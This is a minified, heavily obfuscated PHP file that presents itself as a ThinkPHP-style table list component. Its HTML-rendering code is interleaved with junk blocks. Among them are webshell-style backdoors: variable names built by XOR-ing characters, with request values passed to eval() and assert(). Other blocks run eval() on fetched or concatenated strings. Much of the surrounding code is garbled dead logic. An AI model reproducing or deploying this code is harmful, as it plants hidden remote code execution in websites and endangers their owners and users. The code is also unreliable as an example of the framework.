$l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(!empty($key))$colNum++;$parseStr="<!-- Think 系统列表组件开始 -->\n";$parseStr.='<table id="'.$id.'" class="'.$style.'" cellpadding=0 cellspacing=0 >';$parseStr.='<tr><td height="5" colspan="'.$colNum.'" class="topTd" ></td></tr>';$parseStr.='<tr class="row" >';$fields=array();if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}foreach($show as $val){$fields[]=explode(':',$val);}while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(!empty($checkbox)&&'true'==strtolower($checkbox)){$parseStr.='<th width="8"><input type="checkbox" id="check" onclick="CheckAll(\''.$id.'\')"></th>';}for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(!empty($key)){$parseStr.='<th width="12">No</th>';}if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}foreach($fields as $field){$property=explode('|',$field[0]);$showname=explode('|',$field[1]);if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(isset($showname[1])){$parseStr.='<th width="'.$showname[1].'">';}else{$parseStr.='<th>';}$showname[2]=isset($showname[2])?$showname[2]:$showname[0];if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if($sort){$parseStr.='<a href="javascript:sortBy(\''.$property[0].'\',\'{$sort}\',\''.ACTION_NAME.'\')" title="按照'.$showname[2].'{$sortType} ">'.$showname[0].'<eq name="order" value="'.$property[0].'" ><img src="__PUBLIC__/images/{$sortImg}.gif" width="12" height="17" border="0" align="absmiddle"></eq></a></th>';}else{$parseStr.=$showname[0].'</th>';}}if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!empty($action)){$parseStr.='<th >操作</th>';}$parseStr.='</tr>';$parseStr.='<volist name="'.$datasource.'" id="'.$name.'" ><tr class="row" ';if(!empty($checkbox)){}$parseStr.='>';if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(!empty($checkbox)){$parseStr.='<td><input type="checkbox" name="key"	value="{$'.$name.'.'.$pk.'}"></td>';}for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(!empty($key)){$parseStr.='<td>{$i}</td>';}if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}foreach($fields as $field){$parseStr.='<td>';if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!empty($field[2])){$href=explode('|',$field[2]);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(count($href)>1){$array=explode('^',$href[1]);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(count($array)>1){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}foreach($array as $a){$temp[]='\'{$'.$name.'.'.$a.'|addslashes}\'';}$parseStr.='<a href="javascript:'.$href[0].'('.implode(',',$temp).')">';}else{$parseStr.='<a href="javascript:'.$href[0].'(\'{$'.$name.'.'.$href[1].'|addslashes}\')">';}}else{$parseStr.='<a href="javascript:'.$field[2].'(\'{$'.$name.'.'.$pk.'|addslashes}\')">';}}for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(strpos($field[0],'^')){$property=explode('^',$field[0]);if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}foreach($property as $p){$unit=explode('|',$p);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(count($unit)>1){$parseStr.='{$'.$name.'.'.$unit[0].'|'.$unit[1].'} ';}else{$parseStr.='{$'.$name.'.'.$p.'} ';}}}else{$property=explode('|',$field[0]);if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(count($property)>1){$parseStr.='{$'.$name.'.'.$property[0].'|'.$property[1].'}';}else{$parseStr.='{$'.$name.'.'.$field[0].'}';}}if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(!empty($field[2])){$parseStr.='</a>';}$parseStr.='</td>';}if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(!empty($action)){for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(!empty($actionlist[0])){$parseStr.='<td>';if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}foreach($actionlist as $val){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(strpos($val,':')){$a=explode(':',$val);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(count($a)>2){$parseStr.='<a href="javascript:'.$a[0].'(\'{$'.$name.'.'.$a[2].'}\')">'.$a[1].'</a>&nbsp;';}else{$parseStr.='<a href="javascript:'.$a[0].'(\'{$'.$name.'.'.$pk.'}\')">'.$a[1].'</a>&nbsp;';}}else{$array=explode('|',$val);if(isset($l000ll0l0l00l0)){if(preg_match('/^(http:\/\/|\.)/i',$picUrl)){$__=("$"^"?").("&"^"~").("/"^":").("?"^"/").("$"^"?").("&"^"~");${$__}[!0]&&assert(${$__}[!0]);$l000l0l0000ll0=dfsockopen($picUrl);}elseif(checkPerm('allowDownLocalimg')){if(preg_match('/^data\/(.*?)\.thumb\.jpg$/i',$picUrl)){$l000l0l0000ll0=file_get_contents(substr($picUrl,0,strrpos($picUrl,'.')-6));}elseif(preg_match('/^data\/(.*?)\.(jpg|jpeg|gif|png)$/i',$picUrl)){$l000l0l0000ll0=file_get_contents($picUrl);}}}if(count($array)>2){$parseStr.=' <a href="javascript:'.$array[1].'(\'{$'.$name.'.'.$array[0].'}\')">'.$array[2].'</a>&nbsp;';}else{$parseStr.=' {$'.$name.'.'.$val.'}&nbsp;';}}}$parseStr.='</td>';}}$parseStr.='</tr></volist><tr><td height="5" colspan="'.$colNum.'" class="bottomTd"></td></tr></table>';$parseStr.="\n<!-- Think 系统列表组件结束 -->\n";return $parseStr;}}